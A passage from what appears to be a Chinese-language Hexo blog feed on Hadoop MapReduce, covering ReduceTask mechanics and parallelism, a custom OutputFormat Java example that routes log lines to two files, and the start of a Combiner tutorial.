小文件产生的随机读取带来的开销。</p><h1 id="二：ReduceTask-工作机制"><a href="#二：ReduceTask-工作机制" class="headerlink" title="二：ReduceTask 工作机制"></a>二：ReduceTask 工作机制</h1><p><img src="/blog/77ff229c.html/image-20221219121913332.png"></p><p>（1）Copy 阶段：ReduceTask 从各个 MapTask 上远程拷贝一片数据，并针对某一片数 据，如果其大小超过一定阈值，则写到磁盘上，否则直接放到内存中。</p><p>（2）Sort 阶段：在远程拷贝数据的同时，ReduceTask 启动了两个后台线程对内存和磁 盘上的文件进行合并，以防止内存使用过多或磁盘上文件过多。按照 MapReduce 语义，用 户编写 reduce()函数输入数据是按 key 进行聚集的一组数据。为了将 key 相同的数据聚在一 起，Hadoop 采用了基于排序的策略。由于各个 MapTask 已经实现对自己的处理结果进行了 局部排序，因此，ReduceTask 只需对所有数据进行一次归并排序即可。</p><p>（3）Reduce 阶段：reduce()函数将计算结果写到 HDFS 上。</p><h1 id="三：ReduceTask-并行度决定机制"><a href="#三：ReduceTask-并行度决定机制" class="headerlink" title="三：ReduceTask 并行度决定机制"></a>三：ReduceTask 并行度决定机制</h1><p>MapTask 并行度由切片个数决定，切片个数由输入文件和切片规则决定。</p><h2 id="3-1-设置-ReduceTask-并行度（个数）"><a href="#3-1-设置-ReduceTask-并行度（个数）" class="headerlink" title="3.1 设置 ReduceTask 并行度（个数）"></a>3.1 设置 ReduceTask 并行度（个数）</h2><p>ReduceTask 的并行度同样影响整个 Job 的执行并发度和执行效率，但与 MapTask 的并发数由切片数决定不同，ReduceTask 数量的决定是可以直接手动设置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认值是 1，手动设置为 4</span></span><br><span class="line">job.setNumReduceTasks(<span class="number">4</span>);</span><br></pre></td></tr></table></figure><h2 id="3-2-实验：测试-ReduceTask-多少合适"><a href="#3-2-实验：测试-ReduceTask-多少合适" class="headerlink" title="3.2 实验：测试 ReduceTask 多少合适?"></a>3.2 实验：测试 ReduceTask 多少合适?</h2><p>（1）实验环境：1 个 Master 节点，16 个 Slave 节点：CPU:8GHZ，内存: 2G</p><p>（2）实验结论：</p><p>观察实验数据，可知满足正态分布，故而可以得出最优解。</p><p><img src="/blog/77ff229c.html/image-20221219122251264.png"></p><h2 id="3-2-注意事项"><a href="#3-2-注意事项" class="headerlink" title="3.2 注意事项"></a>3.2 注意事项</h2><ul><li>ReduceTask&#x3D;0，表示没有Reduce阶段，输出文件个数和Map个数一致。</li><li>ReduceTask默认值就是1，所以输出文件个数为一个。</li><li>如果数据分布不均匀，就有可能在Reduce阶段产生数据倾斜。</li><li>ReduceTask数量并不是任意设置，还要考虑业务逻辑需求，有些情况下，需要计算全 局汇总结果，就只能有1个ReduceTask。</li><li>具体多少个ReduceTask，需要根据集群性能而定。</li><li>如果分区数不是1，但是ReduceTask为1，是否执行分区过程。答案是：不执行分区过程。因为在MapTask的源码中，执行分区的前提是先判断ReduceNum个数是否大于1。不大于1 肯定不执行。</li></ul><h1 id="四：MapTask-amp-ReduceTask-源码解析"><a href="#四：MapTask-amp-ReduceTask-源码解析" class="headerlink" title="四：MapTask &amp; ReduceTask 源码解析"></a>四：MapTask &amp; ReduceTask 源码解析</h1><h2 id="4-1-MapTask-源码解析流程"><a href="#4-1-MapTask-源码解析流程" class="headerlink" title="4.1 MapTask 源码解析流程"></a>4.1 MapTask 源码解析流程</h2><p><img src="/blog/77ff229c.html/image-20230201145206556.png"></p><h2 id="4-2-ReduceTask-源码解析流程"><a href="#4-2-ReduceTask-源码解析流程" class="headerlink" title="4.2 ReduceTask 源码解析流程"></a>4.2 ReduceTask 源码解析流程</h2><p><img src="/blog/77ff229c.html/image-20230201150523559.png"></p><p><img src="/blog/77ff229c.html/image-20230201150555973.png"></p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce OutputFormat数据输出</title>
      <link href="/blog/83c17171.html/"/>
      <url>/blog/83c17171.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：OutputFormat-接口实现类"><a href="#一：OutputFormat-接口实现类" class="headerlink" title="一：OutputFormat 接口实现类"></a>一：OutputFormat 接口实现类</h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><p>OutputFormat是MapReduce输出的基类，所有实现MapReduce输出都实现了 OutputFormat 接口。下面我们介绍几种常见的OutputFormat实现类。</p><h2 id="1-2-OutputFormat实现类"><a href="#1-2-OutputFormat实现类" class="headerlink" title="1.2 OutputFormat实现类"></a>1.2 OutputFormat实现类</h2><p><img src="/blog/83c17171.html/image-20221219095707511.png"></p><h2 id="1-3-默认输出格式TextOutputFormat"><a href="#1-3-默认输出格式TextOutputFormat" class="headerlink" title="1.3 默认输出格式TextOutputFormat"></a>1.3 默认输出格式TextOutputFormat</h2><h2 id="1-4-自定义OutputFormat"><a href="#1-4-自定义OutputFormat" class="headerlink" title="1.4 自定义OutputFormat"></a>1.4 自定义OutputFormat</h2><h3 id="（1）-应用场景"><a href="#（1）-应用场景" class="headerlink" title="（1） 应用场景"></a>（1） 应用场景</h3><p>例如：输出数据到MySQL&#x2F;HBase&#x2F;Elasticsearch等存储框架中。</p><h3 id="（2）自定义OutputFormat步骤"><a href="#（2）自定义OutputFormat步骤" class="headerlink" title="（2）自定义OutputFormat步骤"></a>（2）自定义OutputFormat步骤</h3><ul><li>自定义一个类继承FileOutputFormat</li><li>改写RecordWriter，具体改写输出数据的方法write()</li></ul><h1 id="二：自定义-OutputFormat-案例实操"><a href="#二：自定义-OutputFormat-案例实操" class="headerlink" title="二：自定义 OutputFormat 案例实操"></a>二：自定义 OutputFormat 案例实操</h1><h2 id="2-1-需求"><a href="#2-1-需求" class="headerlink" title="2.1 需求"></a>2.1 需求</h2><p>过滤输入的 log 日志，包含 aiyingke 的网站输出到 e:&#x2F;aiyingke.log，不包含 aiyingke 的网站输出到 e:&#x2F;other.log；</p><h3 id="（1）输入数据"><a href="#（1）输入数据" class="headerlink" title="（1）输入数据"></a>（1）输入数据</h3><ul><li>log.txt</li></ul><h3 id="（2）期望输出数据"><a href="#（2）期望输出数据" class="headerlink" title="（2）期望输出数据"></a>（2）期望输出数据</h3><ul><li>aiyingke.log</li><li>other.log</li></ul><h2 id="2-2-需求分析"><a href="#2-2-需求分析" class="headerlink" title="2.2 需求分析"></a>2.2 需求分析</h2><ul><li>需求</li><li>输入数据</li><li>输出数据</li><li>自定义一个 OutputFormat 类<ul><li>创建一个类LogRecordWriter继承RecordWriter</li><li>创建两个文件的输出流：aiyingke，other</li><li>如果输入数据包含aiyingke，输出到aiyingkeOut流 如果不包含aiyingke，输出到otherOut流</li></ul></li><li>驱动类 Driver<ul><li>要将自定义的输出格式组件设置到job中</li><li>job.setOutputFormatClass(LogOutputFormat.class) ;</li></ul></li></ul><h2 id="2-3-代码实现"><a href="#2-3-代码实现" class="headerlink" title="2.3 代码实现"></a>2.3 代码实现</h2><h3 id="（1）编写-LogMapper-类"><a href="#（1）编写-LogMapper-类" class="headerlink" title="（1）编写 LogMapper 类"></a>（1）编写 LogMapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.outputformat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 10:08 2022/12/19</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;Object, Text, Text, NullWritable&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, NullWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// https://aiyingke.cn</span></span><br><span class="line">        <span class="comment">// 互换 KV 位置</span></span><br><span class="line">        context.write(value, NullWritable.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）编写-LogReducer-类"><a href="#（2）编写-LogReducer-类" class="headerlink" title="（2）编写 LogReducer 类"></a>（2）编写 LogReducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.outputformat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 10:11 2022/12/19</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, NullWritable, Text, NullWritable&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;NullWritable&gt; values, Reducer&lt;Text, NullWritable, Text, NullWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// key 相同情况,进入同一个reduce,遍历结果</span></span><br><span class="line">        <span class="keyword">for</span> (NullWritable value : values) &#123;</span><br><span class="line">            <span class="comment">// 写出</span></span><br><span class="line">            context.write(key, NullWritable.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）自定义一个-LogOutputFormat-类"><a href="#（3）自定义一个-LogOutputFormat-类" class="headerlink" title="（3）自定义一个 LogOutputFormat 类"></a>（3）自定义一个 LogOutputFormat 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.outputformat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.RecordWriter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.TaskAttemptContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 10:15 2022/12/19</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogOutputFormat</span> <span class="keyword">extends</span> <span class="title class_">FileOutputFormat</span>&lt;Text, NullWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> RecordWriter&lt;Text, NullWritable&gt; <span class="title function_">getRecordWriter</span><span class="params">(TaskAttemptContext job)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 创建自定义的 LogRecordWriter</span></span><br><span class="line">        <span class="type">LogRecordWriter</span> <span class="variable">lrw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LogRecordWriter</span>(job);</span><br><span class="line">        <span class="keyword">return</span> lrw;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）编写-LogRecordWriter-类"><a href="#（4）编写-LogRecordWriter-类" class="headerlink" title="（4）编写 LogRecordWriter 类"></a>（4）编写 LogRecordWriter 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.outputformat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.RecordWriter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.TaskAttemptContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 10:44 2022/12/19</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogRecordWriter</span> <span class="keyword">extends</span> <span class="title class_">RecordWriter</span>&lt;Text, NullWritable&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FSDataOutputStream otherOut;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FSDataOutputStream aiyingkeOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LogRecordWriter</span><span class="params">(TaskAttemptContext job)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取文件系统</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">FileSystem</span> <span class="variable">fileSystem</span> <span class="operator">=</span> FileSystem.get(job.getConfiguration());</span><br><span class="line">            <span class="comment">// 用文件系统对象创建两个输出流对应不同的目录</span></span><br><span class="line">            aiyingkeOut = fileSystem.create(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\logOut\\aiyingke\\aiyingke.log&quot;</span>));</span><br><span class="line">            otherOut = fileSystem.create(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\logOut\\other\\other.log&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(Text text, NullWritable nullWritable)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> text.toString();</span><br><span class="line">        <span class="comment">// 根据当前行是否包含 aiyingke 决定采用哪个流输出</span></span><br><span class="line">        <span class="keyword">if</span> (line.contains(<span class="string">&quot;aiyingke&quot;</span>)) &#123;</span><br><span class="line">            aiyingkeOut.writeBytes(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            otherOut.writeBytes(line + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">(TaskAttemptContext taskAttemptContext)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        IOUtils.closeStream(aiyingkeOut);</span><br><span class="line">        IOUtils.closeStream(otherOut);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（5）编写-LogDriver-类"><a href="#（5）编写-LogDriver-类" class="headerlink" title="（5）编写 LogDriver 类"></a>（5）编写 LogDriver 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.outputformat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.NullWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 11:04 2022/12/19</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       1.拿到配置环境变量</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       2.拿到job作业对象</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance(configuration, <span class="string">&quot;Log&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       3.设置主类，（即：告知集群入口jar包在哪）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setJarByClass(LogDriver.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *      4.设置 mapper  reducer</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setMapperClass(LogMapper.class);</span><br><span class="line">        job.setReducerClass(LogReducer.class);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       5.设置输出 key value的类型</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(NullWritable.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置自定义的 OutputFormat</span></span><br><span class="line">        job.setOutputFormatClass(LogOutputFormat.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       6.设置输入、输出的数据路径</span></span><br><span class="line"><span class="comment">         *         虽然我们定义了 OutputFormat ,但是因为我们的 OutputFormat 继承自 FileOutputFormat</span></span><br><span class="line"><span class="comment">         *         而 FileOutputFormat 要输出一个 _SUCCESS 的标志文件,所以这里换得指定一个输出目录</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        FileInputFormat.addInputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\log\\&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\logOut\\&quot;</span>));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         *       7.提交执行</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        System.exit(job.waitForCompletion(<span class="literal">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mapreduce Combiner合并</title>
      <link href="/blog/b3e50fdd.html/"/>
      <url>/blog/b3e50fdd.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Combiner合并概述"><a href="#一：Combiner合并概述" class="headerlink" title="一：Combiner合并概述"></a>一：Combiner合并概述</h1><p>（1）Combiner是MR程序中Mapper和Reducer之外的一种组件。</p><p>（2）Combiner组件的父类就是Reducer。</p><p>（3）Combiner和Reducer的区别在于运行的位置</p><ul><li>Combiner是在每一个MapTask所在的节点运行</li><li>Reducer是接收全局所有Mapper的输出结果</li></ul><p>（4）Combiner的意义就是对每一个MapTask的输出进行局部汇总，以减小网络传输量。</p><p>（5）Combiner能够应用的前提是不能影响最终的业务逻辑，而且，Combiner的输出kv 应该跟Reducer的输入kv类型要对应起来。以下求平均值就不能够使用 Combiner；</p><p><img src="/blog/b3e50fdd.html/image-20221218183450549.png"></p><h1 id="二：自定义-Combiner-实现步骤"><a href="#二：自定义-Combiner-实现步骤" class="headerlink" title="二：自定义 Combiner 实现步骤"></a>二：自定义 Combiner 实现步骤</h1><h2 id="2-1-自定义一个-Combiner-继承-Reducer，重写-Reduce-方法"><a href="#2-1-自定义一个-Combiner-继承-Reducer，重写-Reduce-方法" class="headerlink" title="2.1 自定义一个 Combiner 继承 Reducer，重写 Reduce 方法"></a>2.1 自定义一个 Combiner 继承 Reducer，重写 Reduce 方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">## 2.2 在 Job 驱动类中设置</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 三：Combiner 合并案例实操</span><br><span class="line"></span><br><span class="line">## 3.1 需求</span><br><span class="line"></span><br><span class="line">统计过程中对每一个 MapTask 的输出进行局部汇总，以减小网络传输量即采用 Combiner 功能。</span><br><span class="line"></span><br><span class="line">### （1）数据输入</span><br><span class="line"></span><br><span class="line">- data.txt</span><br><span class="line"></span><br><span class="line">### （2）期望输出数据</span><br><span class="line"></span><br><span class="line">- Combine 输入数据多，输出时经过合并，输出数据降低。</span><br><span class="line"></span><br><span class="line">## 3.2 需求分析</span><br><span class="line"></span><br><span class="line">对每一个MapTask的输出局部汇总（Combiner）；</span><br><span class="line"></span><br><span 